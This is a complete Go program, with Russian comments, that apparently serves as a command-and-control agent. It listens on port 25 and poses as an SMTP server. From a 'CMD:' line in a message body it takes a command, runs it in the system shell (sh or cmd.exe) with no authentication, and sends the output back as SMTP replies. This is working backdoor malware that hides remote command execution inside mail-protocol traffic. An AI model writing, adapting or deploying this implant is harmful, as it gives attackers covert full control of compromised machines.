package main

import (
    "bufio"
    "bytes"
    "context"
    "fmt"
    "log"
    "net"
    "os/exec"
    "runtime"
    "strings"
    "time"
)

const (
    ListenAddr = ":25" // слушаем 0.0.0.0:25 — нужен админ/корневой запуск
)

func main() {
    ln, err := net.Listen("tcp", ListenAddr)
    if err != nil {
        log.Fatalf("Listen %s error: %v", ListenAddr, err)
    }
    log.Printf("Agent: listening on %s", ListenAddr)
    for {
        conn, err := ln.Accept()
        if err != nil {
            log.Println("Accept error:", err)
            continue
        }
        go handleConnection(conn)
    }
}

func handleConnection(conn net.Conn) {
    defer conn.Close()
    rd := bufio.NewReader(conn)
    // SMTP-приветствие
    conn.Write([]byte("220 local.agent C2 ready\r\n"))

    for {
        line, err := rd.ReadString('\n')
        if err != nil {
            return
        }
        cmd := strings.TrimSpace(line)
        up := strings.ToUpper(cmd)

        switch {
        case strings.HasPrefix(up, "HELO"), strings.HasPrefix(up, "EHLO"):
            conn.Write([]byte("250 Hello\r\n"))
        case strings.HasPrefix(up, "MAIL FROM:"):
            conn.Write([]byte("250 OK\r\n"))
        case strings.HasPrefix(up, "RCPT TO:"):
            conn.Write([]byte("250 OK\r\n"))
        case up == "DATA":
            conn.Write([]byte("354 Enter message, end with <CR><LF>.<CR><LF>\r\n"))

            // читаем до точки на строке
            var buf bytes.Buffer
            for {
                l, err := rd.ReadString('\n')
                if err != nil {
                    return
                }
                if strings.TrimSpace(l) == "." {
                    break
                }
                buf.WriteString(l)
            }

            // вытаскиваем CMD:
            cmdLine := ""
            for _, l := range strings.Split(buf.String(), "\n") {
                if strings.HasPrefix(l, "CMD:") {
                    cmdLine = strings.TrimSpace(l[len("CMD:"):])
                    break
                }
            }

            // исполняем в шелле
            output := runShell(cmdLine)

            // формируем многострочный ответ — все промежуточные с дефисом
            conn.Write([]byte("250-Command output:\r\n"))
            for _, outLine := range strings.Split(string(output), "\n") {
                conn.Write([]byte("250-" + outLine + "\r\n"))
            }
            // финальная строка с пробелом
            conn.Write([]byte("250 End\r\n"))

            // закрываем SMTP-сессию
            conn.Write([]byte("221 Bye\r\n"))
            return

        case up == "QUIT":
            conn.Write([]byte("221 Bye\r\n"))
            return

        default:
            conn.Write([]byte("250 OK\r\n"))
        }
    }
}

// runShell выполняет команду через системную оболочку
func runShell(cmdLine string) []byte {
    if cmdLine == "" {
        return []byte("No CMD provided")
    }
    var cmd *exec.Cmd
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd.exe", "/C", cmdLine)
    } else {
        cmd = exec.Command("/bin/sh", "-c", cmdLine)
    }
    ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
    defer cancel()
    cmd = exec.CommandContext(ctx, cmd.Path, cmd.Args[1:]...)
    out, err := cmd.CombinedOutput()
    if err != nil {
        return []byte(fmt.Sprintf("Error: %v\n%s", err, out))
    }
    return out
}
